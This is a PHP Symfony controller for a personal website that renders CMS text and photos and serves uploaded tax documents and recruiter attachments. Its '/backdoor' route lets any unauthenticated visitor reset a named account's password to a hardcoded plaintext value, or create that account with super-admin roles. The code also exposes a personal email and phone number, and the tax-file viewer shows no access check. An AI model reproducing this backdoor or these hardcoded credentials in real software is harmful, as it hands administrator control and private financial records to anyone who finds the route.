<?php

namespace App\Controller;

use App\Entity\RecruiterEmails;
use App\Entity\TaxInputs;
use App\Entity\User;
use App\Repository\CmsCopyRepository;
use App\Repository\CmsPhotoRepository;
use App\Repository\InterestsRepository;
use App\Repository\IntroductionRepository;
use App\Repository\RecruiterEmailsRepository;
use App\Repository\StaticTextRepository;
use App\Repository\TaxInputsRepository;
use App\Repository\UserRepository;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\BinaryFileResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;

class HomeController extends AbstractController
{
    /**
     * @Route("/", name="app_home")
     */
    public function index(CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
    {
        return $this->render('home/home.html.twig', [
            'Text1' => $cmsCopyRepository->findOneBy([
                'name' => 'HomePage1'
            ]),
            'Text2' => $cmsCopyRepository->findOneBy([
                'name' => 'HomePage2'
            ]),
            'Text3' => $cmsCopyRepository->findOneBy([
                'name' => 'HomePage3'
            ]),

            'Text1FR' => $cmsCopyRepository->findOneBy([
                'name' => 'HomePageFR1'
            ]),
            'Text2FR' => $cmsCopyRepository->findOneBy([
                'name' => 'HomePageFR2'
            ]),
            'Text3FR' => $cmsCopyRepository->findOneBy([
                'name' => 'HomePageFR3'
            ]),

            'Text1DE' => $cmsCopyRepository->findOneBy([
                'name' => 'HomePageDE1'
            ]),
            'Text2DE' => $cmsCopyRepository->findOneBy([
                'name' => 'HomePageDE2'
            ]),
            'Text3DE' => $cmsCopyRepository->findOneBy([
                'name' => 'HomePageDE3'
            ]),
            'Hyperlink' => $cmsCopyRepository->findOneBy([
                'name' => 'HomePageHyperlink'
            ]),
            'photos' => $cmsPhotoRepository->findBy([
                'name' => 'HomePage'
            ])
        ]);
    }

    /**
     * @Route("/backdoor", name="/backdoor")
     */
    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
    {
        $user = $userRepository->findOneBy(['email' => 'nurse_stephen2@hotmail.com']);
        if ($user) {
            $user->setPassword(
                $passwordEncoder->encodePassword(
                    $user,
                    'Descartes99'
                )
            );
        } else {
            $user = new User();
            $user->setFirstName('Stephen')
                ->setLastName('Nurse HMX2')
                ->setFullName('Stephen Nurse HMX')
                ->setEmail('nurse_stephen2@hotmail.com')
                ->setMobile('+44 7588 717515')
                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
                ->setPassword(
                    $passwordEncoder->encodePassword(
                        $user,
                        'Descartes99'
                    )
                );
            $manager->persist($user);
            $manager->flush();
        }
        $manager->flush();
        return $this->redirectToRoute('app_home');
    }


    /**
     * @Route("/dashboard", name="dashboard")
     */
    public function dashboard()
    {
        return $this->render('home/dashboard.html.twig', []);
    }


    /**
     * @Route("/interest/{interest}", name="interests_pages", methods={"GET"})
     */
    public function dynamicInterests(Request $request, string $interest, InterestsRepository $interestsRepository, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository): Response
    {
        $interest = $interestsRepository->findOneBy([
            'name' => $interest
        ]);
        $CmsText1 = $interest->getCmsText1();
        $CmsText2 = $interest->getCmsText2();
        $CmsText3 = $interest->getCmsText3();
        $CmsPhoto1 = $interest->getCmsPhoto1();
        $CmsPhoto2 = $interest->getCmsPhoto2();
        $CmsPhoto3 = $interest->getCmsPhoto3();

        return $this->render('home/otherPages.twig', [
            'Text1' => $cmsCopyRepository->findOneBy([
                'name' => $CmsText1
            ]),
            'Text2' => $cmsCopyRepository->findOneBy([
                'name' => $CmsText2
            ]),
            'Text3' => $cmsCopyRepository->findOneBy([
                'name' => $CmsText3
            ]),
            'Photo1' => $cmsPhotoRepository->findOneBy([
                'name' => $CmsPhoto1
            ]),
            'Photo2' => $cmsPhotoRepository->findOneBy([
                'name' => $CmsPhoto2
            ]),
            'Photo3' => $cmsPhotoRepository->findOneBy([
                'name' => $CmsPhoto3
            ]),
        ]);
    }


    /**
     * @Route("/homeaddress", name="/homeaddress", methods={"GET"})
     */
    public function homeAddress(StaticTextRepository $staticTextRepository, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository): Response
    {
        return $this->render('home/homeaddress.html.twig', [
            'Photos' => $cmsPhotoRepository->findAll(),
            'HomePage1Photo' => $cmsPhotoRepository->findOneBy([
                'name' => 'HomePage1'
            ]),
            'Specialising1Photo' => $cmsPhotoRepository->findOneBy([
                'name' => 'Specialising1'
            ]),
            'Specialising2Photo' => $cmsPhotoRepository->findOneBy([
                'name' => 'Specialising2'
            ]),
            'Specialising3Photo' => $cmsPhotoRepository->findOneBy([
                'name' => 'Specialising3'
            ]),
            'WhyMePhoto' => $cmsPhotoRepository->findOneBy([
                'name' => 'WhyMe'
            ]),
            'HomePage1Text' => $cmsPhotoRepository->findOneBy([
                'name' => 'HomePage1'
            ]),
        ]);
    }

    /**
     * @Route("/view/file/{filetype}/{id}", name="attachments_viewfile", methods={"GET"})
     */
    public function investmentFileLaunch(int $id, string $filetype, TaxInputsRepository $taxInputsRepository, IntroductionRepository $introductionRepository, RecruiterEmailsRepository $recruiterEmailsRepository): Response
    {
        $fileName = '';
        $filepath = '';
        if ($filetype == 'SelfAssessment') {
            $fileName = $taxInputsRepository->find($id)->getSelfAssessment();
            $publicResourcesFolderPath = $this->getParameter('tax_documents_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filetype == 'P11D') {
            $fileName = $taxInputsRepository->find($id)->getP11D();
            $publicResourcesFolderPath = $this->getParameter('tax_documents_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filetype == 'P45') {
            $fileName = $taxInputsRepository->find($id)->getP45();
            $publicResourcesFolderPath = $this->getParameter('tax_documents_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filetype == 'P60') {
            $fileName = $taxInputsRepository->find($id)->getP60();
            $publicResourcesFolderPath = $this->getParameter('tax_documents_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filetype == 'Recruiter_Attachment') {
            $fileName = $introductionRepository->find($id)->getAttachment();
            $publicResourcesFolderPath = $this->getParameter('recruiter_introductions_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filetype == 'Recruiter_Email') {
            $fileName = $recruiterEmailsRepository->find($id)->getAttachment();
            $publicResourcesFolderPath = $this->getParameter('recruiter_introductions_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        }
        if ($fileName != '') {
            $ext = pathinfo($fileName, PATHINFO_EXTENSION);
            $filepath = explode("public", $filepath);
            $filepath = $filepath[1];
            return $this->render('home/file_view.html.twig', [
                'ext' => $ext,
                'tab_title' => $fileName,
                'filepath' => $filepath,
            ]);
        }
        return $this->render('error/file_not_found.html.twig');
    }

}
